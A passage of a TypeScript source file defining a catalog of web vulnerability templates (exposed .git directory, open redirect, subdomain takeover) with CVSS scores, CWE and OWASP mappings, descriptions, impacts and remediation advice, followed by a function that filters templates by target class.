    cwe: "CWE-527",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Information Disclosure",
    component: "/.git/",
    port: 443,
    description:
      "The version-control metadata directory is served publicly, allowing the full repository — including history — to be reconstructed.",
    impact:
      "Discloses source code, and frequently credentials and API keys committed earlier in the project's history.",
    remediation:
      "Block access to dotfile directories at the web server, deploy from build artefacts rather than working trees, and rotate every secret found in the history.",
    references: ["https://cwe.mitre.org/data/definitions/527.html"],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 4,
  },
  {
    key: "open-redirect",
    title: "Unvalidated Redirect on Post-Login Return Parameter",
    severity: "Low",
    cvss: 4.7,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cwe: "CWE-601",
    owasp: "A01:2021 – Broken Access Control",
    category: "Access Control",
    component: "/auth/callback?next=",
    port: 443,
    description:
      "The `next` parameter is followed without validating that the destination is same-origin.",
    impact:
      "Lends the organisation's domain credibility to phishing links and can be chained to leak tokens present in the URL.",
    remediation:
      "Accept only relative paths, or validate against an explicit allow-list of destinations.",
    references: ["https://cwe.mitre.org/data/definitions/601.html"],
    exploitAvailable: true,
    applies: ["web"],
    frequency: 7,
  },
  {
    key: "subdomain-takeover",
    title: "Dangling DNS Record Permits Subdomain Takeover",
    severity: "High",
    cvss: 8.6,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
    cwe: "CWE-350",
    owasp: "A05:2021 – Security Misconfiguration",
    category: "Misconfiguration",
    component: "DNS CNAME record",
    description:
      "A CNAME points at a decommissioned cloud endpoint that is available for anyone to re-register on the provider.",
    impact:
      "An attacker who claims the endpoint serves arbitrary content from a trusted subdomain, enabling convincing phishing and cookie theft scoped to the parent domain.",
    remediation:
      "Remove the dangling record, and add DNS hygiene checks to the decommissioning runbook so records are retired with the resources they point at.",
    references: ["https://cwe.mitre.org/data/definitions/350.html"],
    exploitAvailable: true,
    applies: ["web", "network"],
    frequency: 5,
  },
]

/** Templates applicable to a given target class. */
export function templatesFor(applicability: Applicability[]): VulnTemplate[] {
  return VULN_CATALOG.filter((t) =>
    t.applies.some((a) => a === "any" || applicability.includes(a))
  )
}
